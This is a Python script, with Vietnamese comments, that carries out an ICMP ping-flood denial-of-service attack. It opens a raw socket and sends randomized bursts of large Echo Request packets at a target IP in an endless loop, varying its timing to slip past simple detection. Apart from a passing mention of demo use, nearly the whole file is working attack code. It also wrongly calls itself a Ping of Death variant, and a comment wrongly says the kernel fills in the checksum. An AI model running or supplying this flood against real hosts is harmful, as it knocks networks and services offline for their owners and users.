#!/usr/bin/env python3
"""
ICMP Flood Attack Script
Layer 3 Volumetric DDoS Attack - Ping of Death variant

Đặc điểm:
- Gửi hàng loạt ICMP Echo Request (ping) với tốc độ cao
- Không cần kết nối (connectionless) giống UDP
- Có thể gây nghẽn băng thông và CPU xử lý gói tin
- Dễ bị lọc bởi firewall nhưng hữu ích cho demo

Yêu cầu: Chạy với sudo (cần quyền tạo raw socket)
"""

import socket
import random
import sys
import time
import os

# Cấu hình mục tiêu
target_ip = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.10"
# ICMP không có port, nhưng có thể điều chỉnh packet size
target_payload_size = int(sys.argv[2]) if len(sys.argv) > 2 else 1400  # Gói lớn để tăng hiệu quả

# Kiểm tra quyền root (cần cho raw socket)
if os.geteuid() != 0:
    print("[!] Cảnh báo: ICMP Flood cần chạy với sudo để tạo raw socket!")
    print("[!] Ví dụ: sudo python3 icmp_flood.py 10.0.0.10")
    sys.exit(1)

print(f"[*] Bắt đầu ICMP Flood tấn công {target_ip}...")
print(f"[*] Payload size: ~{target_payload_size} bytes/gói")
print(f"[*] Loại tấn công: Layer 3 Volumetric (Ping Flood)")

# Tạo ICMP Echo Request packet
def create_icmp_packet(payload_size):
    """
    Tạo ICMP Echo Request packet
    Type: 8 (Echo Request)
    Code: 0
    """
    # ICMP Header: Type (1) + Code (1) + Checksum (2) + ID (2) + Sequence (2) = 8 bytes
    icmp_type = 8  # Echo Request
    icmp_code = 0
    icmp_id = random.randint(0, 65535)
    icmp_seq = random.randint(0, 65535)
    
    # Payload ngẫu nhiên
    payload = random.randbytes(payload_size)
    
    # Checksum giả (0x0000) - Kernel sẽ tính lại khi gửi
    header = bytes([icmp_type, icmp_code, 0x00, 0x00]) + \
             icmp_id.to_bytes(2, 'big') + \
             icmp_seq.to_bytes(2, 'big')
    
    return header + payload

packet_count = 0
start_time = time.time()
bytes_sent = 0

try:
    # Tạo raw socket cho ICMP
    # AF_INET: IPv4
    # SOCK_RAW: Raw socket (cần root)
    # IPPROTO_ICMP: Protocol ICMP (số 1)
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    
    # Không cần bind vì ICMP không dùng port
    
    print(f"[+] Raw socket đã tạo thành công. Bắt đầu flood...")
    
    while True:
        # Ngẫu nhiên hóa burst size
        burst_size = random.randint(5, 30)
        current_payload_size = random.randint(64, target_payload_size)
        
        for _ in range(burst_size):
            # Tạo packet ICMP
            packet = create_icmp_packet(current_payload_size)
            
            # Gửi packet (không cần port cho ICMP)
            sock.sendto(packet, (target_ip, 0))
            
            packet_count += 1
            bytes_sent += len(packet)
        
        # Ngẫu nhiên hóa nhịp độ gửi để tránh detection đơn giản
        time.sleep(random.uniform(0.001, 0.05))
        
        # In log mỗi ~5000 gói tin
        if packet_count % 5000 == 0:
            elapsed = time.time() - start_time
            mbps = (bytes_sent * 8) / (elapsed * 1000000)
            print(f"[-] Đã gửi {packet_count} gói ICMP ({bytes_sent/1024/1024:.2f} MB) "
                  f"- Tốc độ: {mbps:.2f} Mbps")

except PermissionError:
    print("[!] Lỗi: Không đủ quyền. Vui lòng chạy với sudo!")
    sys.exit(1)
    
except KeyboardInterrupt:
    end_time = time.time()
    duration = end_time - start_time
    
    print(f"\n[*] Đã dừng tấn công ICMP Flood.")
    print(f"[*] Tổng số gói gửi: {packet_count} gói")
    print(f"[*] Tổng dung lượng: {bytes_sent/1024/1024:.2f} MB ({bytes_sent/1024:.2f} KB)")
    print(f"[*] Thời gian: {duration:.2f} giây")
    print(f"[*] Tốc độ trung bình: {packet_count/duration:.0f} gói/giây")
    print(f"[*] Băng thông: {(bytes_sent*8)/(duration*1000000):.2f} Mbps")
    
except Exception as e:
    print(f"[!] Lỗi: {e}")
    sys.exit(1)
